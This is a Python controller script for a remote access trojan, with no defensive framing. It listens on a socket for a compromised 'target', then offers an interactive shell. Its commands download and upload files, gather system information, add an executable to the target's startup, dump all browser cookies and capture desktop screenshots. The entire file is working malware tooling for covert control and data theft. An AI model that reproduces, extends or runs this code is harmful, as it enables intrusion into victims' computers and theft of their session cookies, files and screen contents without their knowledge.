import socket
import tqdm
from os import path
from sys import stdout
from time import time , sleep
from datetime import date

# set config SERVER_HOST , SERVER_PORT , BUFFER_SIZE
SERVER_HOST = "192.168.1.6"
SERVER_PORT = 7700
BUFFER_SIZE = 1024 * 10000

SEPARATOR = "<sep>"

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)

print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)



while True:
    command = input(f"{cwd} $> ")
    if not command.strip():
        continue
    if command == 'help' or command == '?':
        help_menu = 'Commands\n'
        help_menu += '============\n\n'
        help_menu += ' Command          Description\n'
        help_menu += ' -------          -----------\n'
        help_menu += ' helpr            Show help Menu\n'
        help_menu += ' cd               chenge directory [path]\n'
        help_menu += ' downloadfile     download file from target [filename]\n'
        help_menu += ' uploadfile       upload file to target \n'
        help_menu += ' sysinfo          get system information target\n'
        help_menu += ' exit             close session\n'
        help_menu += ' startup          add [ file.exe ] to startup target\n'
        help_menu += ' dumpcookie       Dump all Cookies\n'
        help_menu += ' screenshot       take a screenshot Desktop\n'
        print(help_menu)
        continue
    if command.lower() == 'dumpcookie':
        client_socket.send(command.encode())
        data_byt = client_socket.recv(BUFFER_SIZE)
        file = open('cookies.txt','wb')
        while True:
            file.write(data_byt)
            data_byt = client_socket.recv(BUFFER_SIZE)
            if data_byt == b'NOTBYT':
                break
        continue 
    if command.split()[0].lower() == 'downloadfile':
        filename = command.split()[1]
        client_socket.send(command.encode())
        filesize = client_socket.recv(BUFFER_SIZE)
        if 'File Not Found !'.encode() in filesize:
            print('File Not Found !')
            continue
        filesize = str((filesize.decode()))
        print(f'FILE SIZE : {filesize}')
        print('Downloading .....')
        data_byt = client_socket.recv(BUFFER_SIZE)
        file = open(filename,'wb')
        while True:
            file.write(data_byt)
            data_byt = client_socket.recv(BUFFER_SIZE)
            if data_byt == b'NOTBYT':
                break
        continue   
    if command.split()[0].lower() == 'uploadfile':
        filename = command.split()[1]
        if path.exists(filename):
            client_socket.send(command.encode())
            filesize = path.getsize(filename)
            file = open(filename,'rb')
            data_byt = file.read(BUFFER_SIZE)
            print(f'FILE SIZE : {filesize}')
            print('Uploading .....')
            while True:
                client_socket.send(data_byt)
                data_byt = file.read(BUFFER_SIZE)
                if not data_byt:
                    client_socket.send('NOTBYT'.encode())
                    break
            continue        
        else:
            print('file not found !')
            continue
    if command.lower() == 'startup':
        client_socket.send('addtostartup'.encode())
        res = client_socket.recv(BUFFER_SIZE).decode()
        print(res)
        continue
    if command.lower() == 'screenshot':
        client_socket.send(command.encode())
        file = open(f'shot{int(date.today().day + time())}.png','wb')
        data_byt = client_socket.recv(BUFFER_SIZE)
        while True:
            file.write(data_byt)
            data_byt = client_socket.recv(BUFFER_SIZE)
            if data_byt == 'NOTBYT'.encode():
                break
        continue       
    if command.lower() == "exit":
        break

    client_socket.send(command.encode())

    output = client_socket.recv(BUFFER_SIZE).decode()

    results, cwd = output.split(SEPARATOR)

    print(results)